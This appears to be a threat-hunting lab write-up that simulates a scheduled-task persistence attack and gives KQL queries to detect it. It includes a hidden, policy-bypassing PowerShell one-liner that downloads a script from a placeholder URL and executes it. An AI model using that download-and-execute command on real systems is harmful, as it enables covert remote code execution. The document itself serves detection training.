# Threat Event (Living Off The Land)
** Task Scheduler Persistence(Living off the Land)**

## Steps The "Bad Actor" Took Create Logs and IoCs:
1. Gained intial access(simulated) and downloaded malicious file called `themachine.html`
2. Once the download is complete, the file then executes a `PowerShell` script
3. Persistence is kept with an initial PowerShell script to create a task in `Task Scheduler` at logon 
4. Execution is triggered two minutes after logon and opens notepad with a message `Hello my son Welcome to the machine`

---

## Command Used To Download and Execute script:
`cmd.exe /c powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/USERNAME/RESPOSITORY/FILE' -OutFile 'C:\YOUR\FILE\PATH\themachine.html.ps1'; & 'C:\YOUR\FILE\PATH\themachine.html.ps1'"`

---

## Tables used to detect IoCs:
| **Parameter**       | **Description**                                                              |
|---------------------|------------------------------------------------------------------------------|
| **Name**| DeviceFileEvents|
| **Info**|https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceinfo-table|
| **Purpose**| Used for detecting `themachine.html` download as well as the creation of the task to run after logon. |

| **Parameter**       | **Description**                                                              |
|---------------------|------------------------------------------------------------------------------|
| **Name**| DeviceProcessEvents|
| **Info**|https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceinfo-table|
| **Purpose**| Used to detect the command line and PowerShell services executing payload.|

---

## Related Queries:
```kql
// PowerShell file downloaded: themachine.html.ps1
// Detect a file downloaded
DeviceProcessEvents
| where DeviceName == target_machine
| where AccountName == "training-vm-1186"
| where Timestamp >=  datetime(2025-04-03)
| where InitiatingProcessFileName in ("cmd.exe")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc

DeviceFileEvents
| where DeviceName startswith target_machine
| where ActionType in ("FileCreated", "FileRenamed")
| where Timestamp >=  datetime(2025-04-03)
| where FolderPath contains "Downloads"
| project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256, Account = InitiatingProcessAccountName
| order by Timestamp desc

//Detect task created in System32 folder
DeviceFileEvents
| where DeviceName startswith target_machine
| where ActionType in ("FileCreated", "FileRenamed")
| where Timestamp >=  datetime(2025-04-03)
| where FolderPath contains "System32"
| project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256, Account = InitiatingProcessAccountName
| order by Timestamp desc

// Detects notepad executing and writing a message to it
DeviceProcessEvents
| where DeviceName == target_machine
| where AccountName == "training-vm-1186"
| where Timestamp >=  datetime(2025-04-03)
| where InitiatingProcessFileName in ("powershell.exe")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
```

---

## Created By:
- **Author Name**: Larry Harris Jr
- **Author Contact**: https://www.linkedin.com/in/larryharrisjr/
- **Date**: April 4, 2025

## Validated By:
- **Reviewer Name**: 
- **Reviewer Contact**: 
- **Validation Date**: 

---

## Additional Notes:
- **None**

---

## Revision History:
| **Version** | **Changes**                   | **Date**         | **Modified By**   |
|-------------|-------------------------------|------------------|-------------------|
| 1.0         | Initial draft                  | `April 4, 2025`  | `Larry Harris Jr`   
